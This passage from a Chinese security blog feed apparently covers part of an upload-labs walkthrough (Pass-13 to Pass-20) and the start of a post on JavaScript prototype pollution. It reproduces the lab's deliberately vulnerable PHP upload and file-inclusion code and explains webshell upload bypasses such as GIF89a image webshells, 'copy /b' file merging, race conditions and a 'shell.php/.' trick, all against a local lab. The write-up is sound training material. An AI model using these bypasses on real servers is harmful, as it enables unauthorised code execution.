string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_type</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><ol><li>马文件头加上<code>GIF89a</code>伪造为gif 图片</li></ol><p><code>include.php</code></p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*/</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-Type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>然后包含上传的文件<code>http://127.0.0.1/include.php?file=./upload/2820211031115131.gif</code></p><ol start="2"><li><code>copy 123.png /b + test.php  12.png</code></li></ol><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$types</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'.jpeg|.png|.gif'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$types</span><span class="token punctuation">,</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><code>getimagesize()</code></p><p>加<code>GIF89a</code>绕过</p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//需要开启php_exif模块</span>    <span class="token variable">$image_type</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$image_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_GIF</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token double-quoted-string string">"gif"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_JPEG</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token double-quoted-string string">"jpg"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token double-quoted-string string">"png"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><code>exif_imagetype()</code></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172350720.png"></p><p>依旧可以<code>GIF89a</code>绕过</p><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">//使用上传的图片生成新的图片</span>            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token boolean constant">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"该文件不是png格式的图片！"</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                 <span class="token comment">//给新图片指定文件名</span>                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".png"</span><span class="token punctuation">;</span>                <span class="token comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>                <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>                           <span class="token punctuation">&#125;</span></code></pre><p><code>二次渲染</code></p><p><strong>GIF</strong></p><p>先上传一个普通的gif图片，经网页渲染后下载下来，放到<code>01editor</code>中和刚才的比较</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172350738.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172350275.png"></p><p>灰色部分是两个文件相同的部分，所以在这里插入php一句话是不会被渲染没的</p><p>然后上传，包含</p><p><strong>PNG</strong>和<strong>JPG</strong>：<a href="https://www.sqlsec.com/2020/10/upload.html#toc-heading-17">https://www.sqlsec.com/2020/10/upload.html#toc-heading-17</a></p><p>​                      <a href="https://xz.aliyun.com/t/2657#toc-3">https://xz.aliyun.com/t/2657#toc-3</a></p><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>先上传，然后检查后缀，如果不在<code>array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;)</code>中,删除</p><p><strong>条件竞争</strong></p><p>使用burp不断上传</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172351029.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172351861.png"></p><p>然后不断访问就能在它删除前访问到</p><h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p><strong>条件竞争</strong></p><p>对后缀限制，先上传，然后重命名</p><p><strong>上传图片马，在它重命名之前进行包含</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172351686.png"></p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p><strong>POST    %00截断</strong></p><h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//检查MIME</span>    <span class="token variable">$allow_type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'image/png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$allow_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"禁止上传该类型文件!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token comment">//检查文件名</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$allow_suffix</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$allow_suffix</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"禁止上传该后缀文件!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"文件上传成功！"</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"文件上传失败！"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"请选择要上传的文件！"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172351922.png"></p><p>这样</p><p><code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1]</code></p><p>拼接后</p><p><code>shell.php/. </code></p><p>而<code>move_uploaded_file()</code>会将后面的<code>/.</code>忽略，成功上传</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;upload-labs&quot;&gt;&lt;a href=&quot;#upload-labs&quot; class=&quot;headerlink&quot; title=&quot;upload-labs&quot;&gt;&lt;/a&gt;upload-labs&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net</summary>
      
    
    
    
    <category term="笔记" scheme="http://lll-nnn.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="upload_libs" scheme="http://lll-nnn.github.io/tags/upload-libs/"/>
    
  </entry>
  
  <entry>
    <title>Js原型链污染</title>
    <link href="http://lll-nnn.github.io/2022/04/16/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://lll-nnn.github.io/2022/04/16/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2022-04-16T09:45:19.000Z</published>
    <updated>2022-04-18T09:16:41.267Z</updated>
    
    <content type="html"><![CDATA[<h2 id="js前置知识"><a href="#js前置知识" class="headerlink" title="js前置知识"></a>js前置知识</h2><blockquote><p> javascript是一个面向对象的语言到但是并没有class和对象的区分，class只是javascript中的一个关键字。</p><p>js中对象可以是一个构造函数或者类声明</p></blockquote><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token constant">A</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>aa <span class="token operator">=</span> a    <span class="token keyword">this</span><span class="token punctuation">.</span>bb <span class="token operator">=</span> b<span class="token punctuation">&#125;</span><span class="token comment">//也可以写成</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>aa <span class="token operator">=</span> a        <span class="token keyword">this</span><span class="token punctuation">.</span>bb <span class="token operator">=</span> b    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>通过<code>new</code>生成实例</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>aa<span class="token punctuation">)</span><span class="token comment">//1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>bb<span class="token punctuation">)</span><span class="token comment">//2</span></code></pre><p><code>new</code>一次就会生成一个新的实例，它们之间没有任何关系，没有共享的属性或者方法</p><p>js中的继承是通过原型链实现的</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204161838941.png"></p><p><code>prototype</code>，构造函数的prototype属性包含了一个对象，所有实例需要共享的属性或者方法放到这里。</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token constant">A</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>aa <span class="token operator">=</span> a    <span class="token keyword">this</span><span class="token punctuation">.</span>bb <span class="token operator">=</span> b<span class="token punctuation">&#125;</span><span class="token class-name">A</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">&#123;</span>s<span class="token operator">:</span><span class="token string">'s'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">var</span> a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">var</span> a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a1<span class="token punctuation">.</span>s<span class="token punctuation">)</span><span class="token comment">//s</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a2<span class="token punctuation">.</span>s<span class="token punctuation">)</span><span class="token comment">//s</span><span class="token class-name">A</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>s <span class="token operator">=</span> <span class="token string">'S'</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a1<span class="token punctuation">.</span>s<span class="token punctuation">)</span><span class="token comment">//S</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a2<span class="token punctuation">.</span>s<span class="token punctuation">)</span><span class="token comment">//S</span></code></pre><p>这样也就实现了继承属性</p><p>添加方法</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token constant">A</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>aa <span class="token operator">=</span> a    <span class="token keyword">this</span><span class="token punctuation">.</span>bb <span class="token operator">=</span> b<span class="token punctuation">&#125;</span><span class="token class-name">A</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">&#123;</span>s<span class="token operator">:</span><span class="token string">'s'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">A</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">print</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">var</span> a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>a1<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//hello</span>a2<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//hello</span></code></pre><p>a1,a2中都没有print()这个方法，但它们有<code>__proto__</code>属性指向<code>A.prototype</code></p><pre class="language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a1<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token comment">//&#123; s: 's', print: [Function (anonymous)] &#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a2<span class="token punctuation">.</span>__proto__ <span class="token operator">==</span> <span class="token class-name">A</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token comment">//true</span></code></pre><p>如果<code>A.prototype</code>中也没有<code>print()</code>这个方法，会继续找<code>A.prototype.__proto__</code>，不断向上寻找，直到<code>null</code></p><pre class="language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a1<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token comment">//&#123; s: 's', print: [Function (anonymous)] &#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a1<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token comment">//[Object: null prototype] &#123;&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a1<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>__proto__<span class="token 